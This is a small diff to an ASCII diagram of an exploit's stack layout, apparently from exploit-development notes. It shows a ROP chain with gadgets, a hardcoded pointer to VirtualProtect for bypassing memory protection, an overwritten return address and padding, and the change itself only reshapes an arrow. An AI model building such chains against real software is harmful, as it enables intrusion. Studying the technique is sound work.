@@ -246,7 +246,7 @@ ESI          |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
              | 0x75bf6164   | ptr to &VirtualProtect(); EBX contains address of VirtualProtect()'s address at this point    
              ----------------   
 ROP chain    |              | POP EBX # RETN
-start here -->  ----------------   
+start here ->----------------   
              | retn addr    | overwritten ret addrss of vulnerable function
              ---------------- 
              | Padding      |
